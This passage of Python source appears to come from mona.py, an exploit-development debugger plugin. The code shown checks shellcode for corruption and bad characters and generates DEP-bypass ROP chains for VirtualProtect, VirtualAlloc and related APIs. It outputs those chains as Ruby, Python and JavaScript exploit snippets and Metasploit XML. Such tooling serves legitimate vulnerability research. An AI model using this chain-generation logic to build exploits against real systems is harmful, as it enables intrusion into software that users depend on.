		highlight = any(x != y for x, y in chunk)
		for l in (line1, line2):
			log(l.ljust(5 + hrspace) + '|', highlight=0)
	log('    `' + hr + "'")

def draw_chunk_table(cmp, log):
	''' Outputs a table that compares the found memory chunks side-by-side
	in input file vs. memory '''
	table = [('', '', '', '', 'File', 'Memory', 'Note')]
	delims = (' ', ' ', ' ', ' | ', ' | ', ' | ', '')
	last_unmodified = cmp.get_last_unmodified_chunk()
	for c in cmp.get_chunks():
		if   c.dy == 0:    note = 'missing'
		elif c.dx > c.dy:  note = 'compacted'
		elif c.dx < c.dy:  note = 'expanded'
		elif c.unmodified: note = 'unmodified!'
		else:              note = 'corrupted'
		table.append((c.i, c.j, c.dx, c.dy, shorten_bytes(c.xchunk), shorten_bytes(c.ychunk), note))

	# draw the table
	sizes = tuple(max(len(str(c)) for c in col) for col in zip(*table))
	for i, row in enumerate(table):
		log(''.join(str(x).ljust(size) + delim for x, size, delim in zip(row, sizes, delims)))
		if i == 0 or (i == last_unmodified + 1 and i < len(table)):
			log('-' * (sum(sizes) + sum(len(d) for d in delims)))

def guess_bad_chars(cmp, log):
	''' Tries to guess bad characters and outputs them '''
	bytes_in_changed_blocks = defaultdict(int)
	chunks = cmp.get_chunks()
	last_unmodified = cmp.get_last_unmodified_chunk()
	for i, c in enumerate(chunks):
		if c.unmodified: continue
		if i == last_unmodified + 1:
			# only report the first character as bad in the final corrupted chunk
			bytes_in_changed_blocks[c.xchunk[0]] += 1
			break
		for b in set(c.xchunk):
			bytes_in_changed_blocks[b] += 1

	# guess bad chars
	likely_bc = [char for char, count in bytes_in_changed_blocks.iteritems() if count > 2]
	if likely_bc:
		log("Very likely bad chars: %s" % bin2hex(sorted(likely_bc)))
	log("Possibly bad chars: %s" % bin2hex(sorted(bytes_in_changed_blocks)))

	# list bytes already omitted from the input
	bytes_omitted_from_input = set(map(chr, range(0, 256))) - set(cmp.x)
	if bytes_omitted_from_input:
		log("Bytes omitted from input: %s" % bin2hex(sorted(bytes_omitted_from_input)))

def memcompare(location, src, comparetable, sctype, smart=True, tablecols=16):
	''' Thoroughly compares an input binary string with a location in memory
	and outputs the results. '''

	# set up logging
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset(False)

	# helpers
	def log(msg='', **kw):
		msg = str(msg)
		dbg.log(msg, address=location, **kw)
		objlogfile.write(msg, logfile)
	def add_to_table(msg):
		locinfo = MnPointer(location).memLocation()
		comparetable.add(0, ['0x%08x' % location, msg, sctype, locinfo])

	objlogfile.write("-" * 100,logfile)
	log('[+] Comparing with memory at location : 0x%08x (%s)' % (location,MnPointer(location).memLocation()), highlight=1)
	dbg.updateLog()

	mem = read_memory(dbg, location, 2*len(src))
	if smart:
		cmp = MemoryComparator(src, mem)
		mapped_chunks = map(''.join, cmp.guess_mapping())
	else:
		mapped_chunks = list(mem[:len(src)]) + [()] * (len(src) - len(mem))
	mapping = zip(src, mapped_chunks)

	broken = [(i,x,y) for i,(x,y) in enumerate(mapping) if x != y]
	if not broken:
		log('!!! Hooray, %s shellcode unmodified !!!' % sctype, focus=1, highlight=1)
		add_to_table('Unmodified')
	else:
		log("Only %d original bytes of '%s' code found." % (len(src) - len(broken), sctype))
		add_to_table('Corruption after %d bytes' % broken[0][0])
		draw_byte_table(mapping, log, columns=tablecols)
		log()
		if smart:
			# print additional analysis
			draw_chunk_table(cmp, log)
			log()
			guess_bad_chars(cmp, log)
			log()


#-----------------------------------------------------------------------#
# ROP related functions
#-----------------------------------------------------------------------#

def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,criteria,objprogressfile,progressfile):
	"""
	Will attempt to produce ROP chains
	"""
	
	global ptr_to_get
	global ptr_counter
	global silent
	global noheader
	global ignoremodules
	

	#vars
	vplogtxt = ""
	
	# RVA ?
	showrva = False
	if "rva" in criteria:
		showrva = True

	#define rop routines
	routinedefs = {}
	routinesetup = {}
	
	virtualprotect 				= [["esi","api"],["ebp","jmp esp"],["ebx",0x201],["edx",0x40],["ecx","&?W"],["edi","ropnop"],["eax","nop"]]
	virtualalloc				= [["esi","api"],["ebp","jmp esp"],["ebx",0x01],["edx",0x1000],["ecx",0x40],["edi","ropnop"],["eax","nop"]]
	setinformationprocess		= [["ebp","api"],["edx",0x22],["ecx","&","0x00000002"],["ebx",0xffffffff],["eax",0x4],["edi","pop"]] 
	setprocessdeppolicy			= [["ebp","api"],["ebx","&","0x00000000"],["edi","pop"]]
	
	routinedefs["VirtualProtect"] 			= virtualprotect
	routinedefs["VirtualAlloc"] 			= virtualalloc
	# only run these on older systems
	osver=dbg.getOsVersion()
	if not (osver == "6" or osver == "7" or osver == "8" or osver == "vista" or osver == "win7" or osver == "2008server" or osver == "win8"):
		routinedefs["SetInformationProcess"]	= setinformationprocess
		routinedefs["SetProcessDEPPolicy"]		= setprocessdeppolicy	
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	routinesetup["VirtualProtect"] = """--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = tr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------"""


	routinesetup["VirtualAlloc"] = """--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------"""

	routinesetup["SetInformationProcess"] = """--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------"""

	routinesetup["SetProcessDEPPolicy"] = """--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------"""

	updatetxt = ""

	for routine in routinedefs:
	
		thischain = {}
		updatetxt = "Attempting to produce rop chain for %s" % routine 
		dbg.log("[+] %s" % updatetxt)
		objprogressfile.write("- " + updatetxt,progressfile)
		vplogtxt += "\n"
		vplogtxt += "#" * 80
		vplogtxt += "\n\nRegister setup for " + routine + "() :\n" + routinesetup[routine] + "\n\n"
		targetOS = "(XP/2003 Server and up)"
		if routine == "SetInformationProcess":
			targetOS = "(XP/2003 Server only)"
		if routine == "SetProcessDEPPolicy":
			targetOS = "(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)"
		title = "ROP Chain for %s() [%s] :" % (routine,targetOS)
		vplogtxt += "\n%s\n" % title
		vplogtxt += ("-" * len(title)) + "\n\n"
		vplogtxt += "*** [ Ruby ] ***\n\n"
		vplogtxt += "\tdef create_rop_chain()\n"
		vplogtxt += '\n\t\t# rop chain generated with mona.py - www.corelan.be'
		vplogtxt += "\n\t\trop_gadgets = \n"
		vplogtxt += "\t\t[\n"
		
		thischaintxt = ""
		
		dbg.updateLog()
		modused = {}
		
		skiplist = []
		replacelist = {}
		toadd = {}
		
		movetolast = []
		regsequences = []
		
		for step in routinedefs[routine]:
			thisreg = step[0]
			thistarget = step[1]
			
			if thisreg in replacelist:
				thistarget = replacelist[thisreg]
			
			if not thisreg in skiplist:
			
				regsequences.append(thisreg)
				
				# this must be done first, so we can determine deviations to the chain using
				# replacelist and skiplist arrays
				if str(thistarget) == "api":
					objprogressfile.write("  * Enumerating ROPFunc info",progressfile)
					dbg.log("    Enumerating ROPFunc info")
					# routine to put api pointer in thisreg
					funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat")
					if routine == "SetProcessDEPPolicy" and funcptr == 0:
						# read EAT
						funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"eat")
						extra = ""
						if funcptr == 0:
							extra = "[-] Unable to find ptr to "
							thischain[thisreg] = [[0,extra + routine + "() (-> to be put in " + thisreg + ")",0]]
						else:
							thischain[thisreg] = putValueInReg(thisreg,funcptr,routine + "() [" + MnPointer(funcptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg],skiplist = getPickupGadget(thisreg,funcptr,functext,suggestions,interestinggadgets,criteria,modulecriteria)
						# if skiplist is not empty, then we are using the alternative pickup (via jmp [eax])
						# this means we have to make some changes to the routine
						# and place this pickup at the end
						
						if len(skiplist) > 0:
							if routine.lower() == "virtualprotect" or routine.lower() == "virtualalloc":
								replacelist["ebp"] = "pop"

								#set up call to finding jmp esp
								oldsilent = silent
								silent=True
								ptr_counter = 0
								ptr_to_get = 3
								jmpreg = findJMP(modulecriteria,criteria,"esp")
								ptr_counter = 0
								ptr_to_get = -1
								jmpptr = 0
								jmptype = ""
								silent=oldsilent
								total = getNrOfDictElements(jmpreg)
								if total > 0:
									ptrindex = random.randint(1,total)
									indexcnt= 1
									for regtype in jmpreg:
										for ptr in jmpreg[regtype]:
											if indexcnt == ptrindex:
												jmpptr = ptr
												jmptype = regtype
												break
											indexcnt += 1
								if jmpptr > 0:
									toadd[thistarget] = [jmpptr,"ptr to '" + jmptype + "'"]
								else:
									toadd[thistarget] = [jmpptr,"ptr to 'jmp esp'"]
								# make sure the pickup is placed last
								movetolast.append(thisreg)
								
					
				if str(thistarget).startswith("jmp"):
					targetreg = str(thistarget).split(" ")[1]
					#set up call to finding jmp esp
					oldsilent = silent
					silent=True
					ptr_counter = 0
					ptr_to_get = 3
					jmpreg = findJMP(modulecriteria,criteria,targetreg)
					ptr_counter = 0
					ptr_to_get = -1
					jmpptr = 0
					jmptype = ""
					silent=oldsilent
					total = getNrOfDictElements(jmpreg)
					if total > 0:
						ptrindex = random.randint(1,total)
						indexcnt= 1					
						for regtype in jmpreg:
							for ptr in jmpreg[regtype]:
								if indexcnt == ptrindex:
									jmpptr = ptr
									jmptype = regtype
									break
								indexcnt += 1
					thischain[thisreg] = putValueInReg(thisreg,jmpptr,"& " + jmptype + " [" + MnPointer(jmpptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget) == "ropnop":
					ropptr = 0
					for poptype in suggestions:
						if poptype.startswith("pop "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0:
									ropptr = retptr+1
									break
						if poptype.startswith("inc "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0:
									ropptr = retptr+1
									break
						if poptype.startswith("dec "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0:
									ropptr = retptr+1
									break
						if poptype.startswith("neg "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0:
									ropptr = retptr+2
									break
								
					if ropptr == 0:
						for emptytype in suggestions:
							if emptytype.startswith("empty "):
								for retptr in suggestions[emptytype]:
									if interestinggadgets[retptr].startswith("# XOR"):
										if getOffset(interestinggadgets[retptr]) == 0:
											ropptr = retptr+2
										break
					if ropptr > 0:
						thischain[thisreg] = putValueInReg(thisreg,ropptr,"RETN (ROP NOP) [" + MnPointer(ropptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,ropptr,"[-] Unable to find ptr to RETN (ROP NOP)",suggestions,interestinggadgets,criteria)					
				
				
				if thistarget.__class__.__name__ == "int" or thistarget.__class__.__name__ == "long":
					thischain[thisreg] = putValueInReg(thisreg,thistarget,"0x" + toHex(thistarget) + "-> " + thisreg,suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget) == "nop":
					thischain[thisreg] = putValueInReg(thisreg,0x90909090,"nop",suggestions,interestinggadgets,criteria)

					
				if str(thistarget).startswith("&?"):
					#pointer to
					rwptr = getAPointer(modulestosearch,criteria,"RW")
					if rwptr == 0:
						rwptr = getAPointer(modulestosearch,criteria,"W")
					if rwptr != 0:
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"&Writable location [" + MnPointer(rwptr).belongsTo()+"]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"[-] Unable to find writable location",suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget).startswith("pop"):
					#get distance
					if "pop " + thisreg in suggestions:
						popptr = getShortestGadget(suggestions["pop "+thisreg])
						junksize = getJunk(interestinggadgets[popptr])-4
						thismodname = MnPointer(popptr).belongsTo()
						thischain[thisreg] = [[popptr,"",junksize],[popptr,"skip 4 bytes [" + thismodname + "]"]]
					else:
						thischain[thisreg] = [[0,"[-] Couldn't find a gadget to put a pointer to a stackpivot (4 bytes) into "+ thisreg,0]]
	
				
				if str(thistarget)==("&"):
					pattern = step[2]
					base = 0
					top = TOP_USERLAND
					type = "ptr"
					al = criteria["accesslevel"]
					criteria["accesslevel"] = "R"
					ptr_counter = 0				
					ptr_to_get = 2
					oldsilent = silent
					silent=True				
					allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
					silent = oldsilent
					criteria["accesslevel"] = al
					if len(allpointers) > 0:
						theptr = 0
						for ptrtype in allpointers:
							for ptrs in allpointers[ptrtype]:
								theptr = ptrs
								break
						thischain[thisreg] = putValueInReg(thisreg,theptr,"&" + str(pattern) + " [" + MnPointer(theptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,0,"[-] Unable to find ptr to " + str(pattern),suggestions,interestinggadgets,criteria)

		returnoffset = 0
		delayedfill = 0
		junksize = 0
		# get longest modulename
		longestmod = 0
		fillersize = 0
		for step in routinedefs[routine]:
			thisreg = step[0]
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					thismodname = MnPointer(gadget[0]).belongsTo()
					if len(thismodname) > longestmod:
						longestmod = len(thismodname)
		if showrva:
			fillersize = longestmod + 8
		else:
			fillersize = 0
		
		# modify the chain order (regsequences array)
		for reg in movetolast:
			if reg in regsequences:
				regsequences.remove(reg)
				regsequences.append(reg)
		
		
		# create the current chain
		ropdbchain = ""
		tohex_array = []
		for step in regsequences:
			thisreg = step
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					gadgetstep = gadget[0]
					steptxt = gadget[1]
					junksize = 0
					showfills = False
					if len(gadget) > 2:
						junksize = gadget[2]
					if gadgetstep in interestinggadgets and steptxt == "":
						thisinstr = interestinggadgets[gadgetstep].lstrip()
						if thisinstr.startswith("#"):
							thisinstr = thisinstr[2:len(thisinstr)]
							showfills = True
						thismodname = MnPointer(gadgetstep).belongsTo()
						thisinstr += " [" + thismodname + "]"
						tmod = MnModule(thismodname)
						if not thismodname in modused:
							modused[thismodname] = [tmod.moduleBase,tmod.__str__()]	
						modprefix = "base_" + thismodname
						if showrva:
							alignsize = longestmod - len(thismodname)
							vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
							thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
						else:
							vplogtxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
							thischaintxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
						ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),thisinstr.strip(" "))
						tohex_array.append(gadgetstep)
						
						if showfills:
							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							if returnoffset > 0:
								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							returnoffset = getOffset(interestinggadgets[gadgetstep])
							if delayedfill > 0:
								vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
								delayedfill = 0
							if thisinstr.startswith("POP "):
								delayedfill = junksize
							else:
								vplogtxt += createJunk(junksize,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(junksize,"Filler (compensate)",fillersize)
								if junksize > 0:
									ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
					else:
						# still could be a pointer
						thismodname = MnPointer(gadgetstep).belongsTo()
						if thismodname != "":
							tmod = MnModule(thismodname)
							if not thismodname in modused:
								modused[thismodname] = [tmod.moduleBase,tmod.__str__()]
							modprefix = "base_" + thismodname
							if showrva:
								alignsize = longestmod - len(thismodname)
								vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
								thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
							else:
								vplogtxt += "\t\t\t0x%s,\t# %s\n" % (toHex(gadgetstep),steptxt)		
								thischaintxt += "\t\t\t0x%s,\t# %s\n" % (toHex(gadgetstep),steptxt)
							ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),steptxt.strip(" "))
						else:						
							vplogtxt += "\t\t\t0x%s,%s\t# %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)
							thischaintxt += "\t\t\t0x%s,%s\t# %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)						
							ropdbchain += '    <gadget value="0x%s">%s</gadget>\n' % (toHex(gadgetstep),steptxt.strip(" "))
						
						if steptxt.startswith("[-]"):
							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							returnoffset = 0
						if delayedfill > 0:
							vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							delayedfill = 0							
						vplogtxt += createJunk(junksize,"",fillersize)
						thischaintxt += createJunk(junksize,"",fillersize)
						if fillersize > 0:
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
		# finish it off
		steptxt = ""
		if "pushad" in suggestions:
			shortest_pushad = getShortestGadget(suggestions["pushad"])
			junksize = getJunk(interestinggadgets[shortest_pushad])
			thisinstr = interestinggadgets[shortest_pushad].lstrip()
			if thisinstr.startswith("#"):
				thisinstr = thisinstr[2:len(thisinstr)]
			thismodname = MnPointer(shortest_pushad).belongsTo()
			thisinstr += " [" + thismodname + "]"
			tmod = MnModule(thismodname)
			if not thismodname in modused:
				modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
			modprefix = "base_" + thismodname
			if showrva:
				alignsize = longestmod - len(thismodname)
				vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
				thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
			else:
				vplogtxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
				thischaintxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
			ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(shortest_pushad-tmod.moduleBase),thisinstr.strip(" "))
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			if fillersize > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
			vplogtxt += createJunk(junksize,"",fillersize)
			thischaintxt += createJunk(junksize,"",fillersize)
			if fillersize > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
			
		else:
			vplogtxt += "\t\t\t0x00000000,%s\t# %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			thischaintxt += "\t\t\t0x00000000,%s\t# %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			ropdbchain += '    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>\n'
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			if returnoffset > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'	
		
		# anything else to add ?
		if len(toadd) > 0:
			for adds in toadd:
				theptr = toadd[adds][0]
				freetext = toadd[adds][1]
				if theptr > 0:
					thismodname = MnPointer(theptr).belongsTo()
					freetext += " [" + thismodname + "]"
					tmod = MnModule(thismodname)
					if not thismodname in modused:
						modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
					modprefix = "base_" + thismodname
					if showrva:
						alignsize = longestmod - len(thismodname)
						vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
						thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
					else:
						vplogtxt += "\t\t\t0x%s,\t# %s\n" % (toHex(theptr),freetext)
						thischaintxt += "\t\t\t0x%s,\t# %s\n" % (toHex(theptr),freetext)
					ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(theptr-tmod.moduleBase),freetext.strip(" "))
				else:
					vplogtxt += "\t\t\t0x%s,\t# <- Unable to find %s\n" % (toHex(theptr),freetext)
					thischaintxt += "\t\t\t0x%s,\t# <- Unable to find %s\n" % (toHex(theptr),freetext)
					ropdbchain += '    <gadget offset="0x%s">Unable to find %s</gadget>\n' % (toHex(theptr),freetext.strip(" "))
		
		vplogtxt += '\t\t].flatten.pack("V*")\n'
		vplogtxt += '\n\t\treturn rop_gadgets\n\n'
		vplogtxt += '\tend\n'
		vplogtxt += '\n\n\t# Call the ROP chain generator inside the \'exploit\' function :\n\n'
		calltxt = "rop_chain = create_rop_chain("
		argtxt = ""
		vplogtxtpy = ""
		vplogtxtjs = ""
		calltxtpy = ""
		argtxtpy = ""
		if showrva:
			for themod in modused:
				vplogtxt += "\t# " + modused[themod][1] + "\n"
				vplogtxtpy += "\t# " + modused[themod][1] + "\n"
				vplogtxtjs += "\t// " + modused[themod][1] + "\n"
				vplogtxt += "\tbase_" + themod + " = 0x%s\n" % toHex(modused[themod][0])
				vplogtxtjs += "\tvar base_" + themod.replace(".","") + " = 0x%s;\n" % toHex(modused[themod][0])
				vplogtxtpy += "\tbase_" + themod + " = struct.pack('<L',0x%s)\n" % toHex(modused[themod][0])
				calltxt += "base_" + themod + ","
				calltxtpy += "base_" + themod + ","
				argtxt += "base_" + themod + ","
				argtxtpy += "base_" + themod + ","				
		calltxt = calltxt.strip(",") + ")\n"
		calltxtpy = calltxtpy.strip(",") + ")\n"
		argtxt = argtxt.strip(",")
		argtxtpy = argtxtpy.strip(",")
		argtxtjs = argtxtpy.replace(".","")
		
		vplogtxt = vplogtxt.replace("create_rop_chain()","create_rop_chain(" + argtxt + ")")
		vplogtxt += '\n\t' + calltxt
		vplogtxt += '\n\n\n'
		# Python
		vplogtxt += "*** [ Python ] ***\n\n"		
		vplogtxt += "\tdef create_rop_chain(%s):\n" % argtxt
		vplogtxt += "\n\t\t# rop chain generated with mona.py - www.corelan.be\n"			
		vplogtxt += "\t\trop_gadgets = \"\"\n"
		if not showrva:
			vplogtxt += thischaintxt.replace("\t0x","rop_gadgets += struct.pack('<L',0x").replace(",\t#",")\t#") 
		else:
			vplogtxt += thischaintxt.replace("\tbase","rop_gadgets += struct.pack('<L',base").replace(",\t#",")\t#").replace("\t\t0x","\trop_gadgets += struct.pack('<L',0x").replace(",  ",")  ")
		vplogtxt += "\t\treturn rop_gadgets\n\n"
		vplogtxt += vplogtxtpy
		vplogtxt += "\trop_chain = create_rop_chain(%s)\n\n" % argtxtpy
		# Javascript
		vplogtxt += "\n\n*** [ JavaScript ] ***\n\n"
		vplogtxt += "\t//rop chain generated with mona.py - www.corelan.be\n"		
		if not showrva:
			vplogtxt += "\trop_gadgets = unescape(\n"
			allptr = thischaintxt.split("\n")
			tptrcnt = 0
			for tptr in allptr:
				comments = tptr.split(",")
				comment = ""
				if len(comments) > 1:
					# add everything
					ic = 1
					while ic < len(comments):
						comment += "," + comments[ic]
						ic += 1
				tptrcnt += 1
				comment = comment.replace("\t","")
				if tptrcnt < len(allptr):
					vplogtxt += "\t\t\"" + toJavaScript(tptr) + "\" + // " + comments[0].replace("\t","").replace(" ","") + " : " + comment + "\n"
				else:
					vplogtxt += "\t\t\"" + toJavaScript(tptr) + "\"); // " + comments[0].replace("\t","").replace(" ","") + " : " + comment + "\n\n"
		else:
			vplogtxt += "\tfunction get_rop_chain(%s) {\n" % argtxtjs
			vplogtxt += "\t\tvar rop_gadgets = [\n"
			vplogtxt += thischaintxt.replace("\t#","\t//").replace(".","")
			vplogtxt += "\t\t\t];\n"
			vplogtxt += "\t\treturn rop_gadgets;\n"
			vplogtxt += "\t}\n\n"
			vplogtxt += "\tfunction gadgets2uni(gadgets) {\n"
			vplogtxt += "\t\tvar uni = \"\";\n"
			vplogtxt += "\t\tfor(var i=0;i<gadgets.length;i++){\n"
			vplogtxt += "\t\t\tuni += d2u(gadgets[i]);\n"
			vplogtxt += "\t\t}\n"
			vplogtxt += "\t\treturn uni;\n"
			vplogtxt += "\t}\n\n"
			vplogtxt += "\tfunction d2u(dword) {\n"
			vplogtxt += "\t\tvar uni = String.fromCharCode(dword & 0xFFFF);\n"
			vplogtxt += "\t\tuni += String.fromCharCode(dword>>16);\n"
			vplogtxt += "\t\treturn uni;\n"
			vplogtxt += "\t}\n\n"
			vplogtxt += "%s" % vplogtxtjs
			vplogtxt += "\n\tvar rop_chain = gadgets2uni(get_rop_chain(%s));\n\n" % argtxtjs
		vplogtxt += '\n--------------------------------------------------------------------------------------------------\n\n'
		
		# MSF RopDB XML Format - spit out if only one module was selected
		if len(modused) == 1:
			modulename = ""
			for modname in modused:
				modulename = modname
			objMod = MnModule(modulename)
			modversion = objMod.moduleVersion
			modbase = objMod.moduleBase
			ropdb = '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
			ropdb += "<db>\n<rop>\n"
			ropdb += "  <compatibility>\n"
			ropdb += "    <target>%s</target>\n" % modversion
			ropdb += "  </compatibility>\n\n"
			ropdb += '  <gadgets base="0x%s">\n' % toHex(modbase)
			ropdb += ropdbchain.replace('[' + modulename + ']','').replace('&','').replace('[IAT ' + modulename + ']','')
			ropdb += '  </gadgets>\n'
			ropdb += '</rop>\n</db>'
			# write to file if needed
			shortmodname = modulename.replace(".dll","")
			ignoremodules = True
			if ropdbchain.lower().find("virtualprotect") > -1:
				ofile = MnLog(shortmodname+"_virtualprotect.xml")
				thisofile = ofile.reset(showheader = False)
				ofile.write(ropdb,thisofile)
			if ropdbchain.lower().find("virtualalloc") > -1:
				ofile = MnLog(shortmodname+"_virtualalloc.xml")
				thisofile = ofile.reset(showheader = False)
				ofile.write(ropdb,thisofile)
			ignoremodules = False
		
		#go to the next one
		
	vpfile = MnLog("rop_chains.txt")
	thisvplog = vpfile.reset()
	vpfile.write(vplogtxt,thisvplog)
	
	dbg.log("[+] ROP chains written to file %s" % thisvplog)
	objprogressfile.write("Done creating rop chains",progressfile)
	return vplogtxt



def getPickupGadget(targetreg,targetval,freetext,suggestions,interestinggadgets,criteria,modulecriteria):
	"""
	Will attempt to find a gadget that will pickup a pointer to pointer into a register
	
	Arguments : the destination register, the value to pick up, some free text about the value,
	suggestions and interestinggadgets dictionaries
	
	Returns :
	an array with the gadgets
	"""
	
	shortest_pickup = 0
	thisshortest_pickup = 0
	shortest_move = 0
	popptr = 0
	
	pickupfrom = ""
	pickupreg = ""
	pickupfound = False
	
	pickupchain = []
	movechain = []
	movechain1 = []
	movechain2 = []
	
	disablelist = []
	
	allregs = ["eax","ebx","ecx","edx","ebp","esi","edi"]
	
	for pickuptypes in suggestions:
		if pickuptypes.find("pickup pointer into " + targetreg) > -1: 
			thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
			if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
				shortest_pickup = thisshortest_pickup
				smallparts = pickuptypes.split(" ")
				pickupreg = smallparts[len(smallparts)-1].lower()
				parts2 = interestinggadgets[shortest_pickup].split("#")
				 #parts2[0] is empty
